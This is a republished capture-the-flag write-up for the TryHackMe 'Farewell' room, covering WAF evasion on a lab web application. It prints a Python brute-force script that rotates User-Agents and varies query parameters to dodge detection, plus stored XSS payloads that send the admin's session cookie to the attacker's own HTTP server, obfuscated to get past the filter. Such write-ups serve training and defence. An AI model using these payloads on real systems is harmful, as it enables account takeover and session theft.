# :game_die: Farewell - THM Writeup. By: Kavin Jindal (@Klevr)

> **Original Source:** [Farewell - THM Writeup. By: Kavin Jindal (@Klevr)](https://infosecwriteups.com/farewell-thm-writeup-9fb5a7c50fe3)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

By: Kavin Jindal (@Klevr)


## Get Avyukt Security’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


[https://tryhackme.com/room/farewell](https://tryhackme.com/room/farewell)


- Farewell is a medium-rated room on TryHackMe, based on WAF (Web Application Firewall) exploitation. It includes bypassing WAF restrictions to brute-force the password of a user account and then use Stored XSS to grab cookies of the admin account and elevate our privileges. In this writeup we will dive deep into every step of compromising the target in the room.

## -0x01: Recon


- I started by running a TCP scan via NMAP on the target.


```
nmap -p- -sC -sV 10.48.138.236
```


```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 23:12 IST
Nmap scan report for 10.48.138.236
Host is up (0.020s latency).

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 9e:6d:b2:d3:84:e9:1a:21:73:63:2f:1f:7e:6f:4f:69 (ECDSA)
|_ 256 48:45:a3:c1:16:49:0b:36:4f:df:c9:41:49:af:d6:52 (ED25519)
80/tcp open http Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags:
| /:
| PHPSESSID:
|_ httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Farewell \xE2\x80\x94 Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds
```


- Nothing much here, after that, I visited the website on port 80.


- It was a very basic login page but there was a scrolling element above the login form where I could see some usernames.

- I viewed the page source and found the following


- `adam` , `deliver11` and `nora` were three usernames that we could use to gain initial access to the website.

- I tried using the above username in the login form for which I got the following error message.


- The error message validated the existence of the username. If we tried some random value it would give us an `Invalid username or password` error.

- Similarly, I tried using `admin` as the username and I got the following.


- Next, I ran Gobuster to enumerate directories on the target. As WAF was deployed, I had to use a custom User-Agent. Using a custom User-Agent is important because Gobuster by default uses its own User-Agent which gets flagged by the firewall. Hence to bypass it, we use a legitimate-looking header to conduct directory enumeration.


```
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,txt,js,json -u http://10.48.138.236 -a "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
```


- The results of the scan were as follows.


- `/admin.php` was a dedicated login page for `admin` which asked for a password.


## -0x02: User Access


- Now, our first objective was to gain access to a user account. For that, I turned on Burp Suite and captured the login requests.

- The response to the login requests had a `password_hint` parameter that revealed password hints for the specific user.


*User: deliver11*


*User: adam*


*User: nora*


*User: admin*


- Now obviously, out of the four password hints I had received, finding the password of `deliver11` seemed the easiest of all.

- `Capital of Japan followed by four digits` was the hint. The capital of Japan is Tokyo, hence that was half the password. The rest half required brute-forcing.

- Using tools like Burp Intruder or `ffuf` would trigger the WAF and could not be used. Hence, I used a custom Python script to carry out the dictionary attack.


```
import requests
import time
import random

x=0
password='Tokyo'

username='deliver11'

# iterate from 1000 to 9999
# change user-agent
# add a fake query to the url everytime to mimic different requests
user_agents = [
'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
]

for x in range(1000, 10000):
url = 'http://10.48.138.236/auth.php'+f'?i={x}'

headers = {
'Content-Type':'application/x-www-form-urlencoded',
'User-Agent': random.choice(user_agents)
}
data = f'username=deliver11&password=Tokyo{x}'
resp = requests.post(url, headers=headers, data=data, timeout=5)
if "auth_failed" in resp.text:
print(f'[FAILED] Payload: "Tokyo{x}", Code: {resp.status_code} || Content: {len(resp.content)}')
else:
print(f'[SUCCESS]Payload: "Tokyo{x}", Code: {resp.status_code} || Content: {len(resp.content)}')

break
```


Explanation of the code


- The primary objective here is to carry out the dictionary attack without triggering the firewall. For that, I had to make sure that the requests were not identical.

- Here, I used a fake GET parameter in the url i.e `?i=` which would bypass any detections based on repetitive requests to a specific URL.

- I used a list of four different user agents, out of which any one would be selected for every request randomly. This was done to avoid making the payloads identical.

- Finally, I used a `for loop` to iterate from `1000` to `9999` and crack the password.

- I ran the code and obtained the password as shown below.


- I had successfully obtained the password for `deliver11` user. I used the credentials and logged in, after which I was redirected to `/dashboard.php` where I found the first flag.


## -0x03: Admin Access


- The following page was obtained after logging in.


- Here, I could send any message that would be approved by the `admin` user after some time.


- What if we could execute XSS on the admin dashboard and grab session cookies to gain access?

- I tried using the basic `<script>alert()</script>` XSS payload which got detected by the WAF.

- Next, I used the following payload to remotely access a file and started a HTTP server at port 8000 on my machine.


```
<img src='http://10.48.69.149:8000/burp.json'>
```


```
python3 -m http.server 8000
```


- I used the above payload and immediately received `GET` requests on the HTTP server.


- This was an indication that the XSS vulnerability could be exploited and the session cookies could be stolen if the right payloads were used.

- I did a lot of testing and concluded that:
`<script>` tags were blocked
`cookie` was specifically blocked
`onload` function did not work with `<img>` tags, but worked with other tags.

- I used the following payload to send the session cookies to the HTTP server.


```
<body onload="new Image().src='http://10.48.69.149:8001?x='+document['coo'+'kie']">
```


- I used `document['coo'+'kie']` instead of `document.cookie` to bypass the WAF restrictions.

- After using the above payload, I received the `admin` cookie on my server as follows.


- I opened up Inspect Element and navigated to the Storage tab where `PHPSESSID` was stored.


- I replaced it with the `admin` cookie obtained above and reloaded the page.


- After that, I navigated to `/admin.php` .


- And with that, I had successfully gained access to the admin panel and obtained the second flag, marking the completion of the room.


I hope you found this walkthrough informative. Don’t forget to follow Avyukt Security for more quality cybersecurity content.


Happy Hacking!

---

*Originally published on [Medium](https://infosecwriteups.com/farewell-thm-writeup-9fb5a7c50fe3). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
